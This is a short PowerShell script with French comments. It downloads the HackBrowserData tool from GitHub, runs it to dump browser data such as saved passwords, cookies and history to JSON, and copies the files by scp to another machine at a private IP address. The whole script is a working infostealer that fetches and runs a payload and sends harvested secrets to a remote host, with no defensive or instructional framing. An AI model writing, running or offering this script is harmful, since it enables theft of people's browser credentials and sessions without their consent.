# Variables
$serverUser = "DELL"
$serverIP = "192.168.0.117"  # Remplace par l'IP du premier PC
$destDir = "/home/$serverUser/hackbrowserdata"
$localPath = "$env:USERPROFILE\hackbrowserdata"

# Créer un dossier temporaire
New-Item -ItemType Directory -Path $localPath -Force

# Vérifier la connexion SSH
Write-Output "[+] Test de connexion SSH..."
$sshTest = Test-Connection -ComputerName $serverIP -Count 1 -Quiet
if (-not $sshTest) {
    Write-Output "[!] Erreur : Impossible de contacter $serverIP. Vérifie ton réseau et SSH."
    exit 1
}

# Télécharger HackBrowserData
Write-Output "[+] Téléchargement de HackBrowserData..."
$downloadUrl = "https://github.com/moonD4rk/HackBrowserData/releases/download/v0.4.6/hack-browser-data-windows-64bit.zip"
$zipPath = "$localPath\hackbrowserdata.zip"

Invoke-WebRequest -Uri $downloadUrl -OutFile $zipPath

# Vérifier si le fichier a été téléchargé
if (-not (Test-Path $zipPath)) {
    Write-Output "[!] Erreur : Échec du téléchargement de HackBrowserData."
    exit 1
}

# Extraire l’archive
Write-Output "[+] Extraction..."
Expand-Archive -Path $zipPath -DestinationPath $localPath -Force

# Vérifier si l'exécutable est présent
$exePath = "$localPath\hack-browser-data.exe"
if (-not (Test-Path $exePath)) {
    Write-Output "[!] Erreur : Fichier hack-browser-data.exe introuvable après extraction."
    exit 1
}

# Exécuter HackBrowserData
Write-Output "[+] Extraction des données..."
Set-Location $localPath
Start-Process -NoNewWindow -FilePath $exePath -ArgumentList "-o json" -Wait

# Vérifier si des fichiers JSON ont été créés
if (-not (Test-Path "$localPath\*.json")) {
    Write-Output "[!] Erreur : Aucun fichier JSON trouvé. HackBrowserData a peut-être échoué."
    exit 1
}

# Transférer les fichiers via WinSCP (SCP)
Write-Output "[+] Envoi des fichiers..."
scp "$localPath\*.json" "$serverUser@$serverIP`:`$destDir"

Write-Output "[+] Terminé ! Les fichiers sont sur $serverIP:`$destDir"
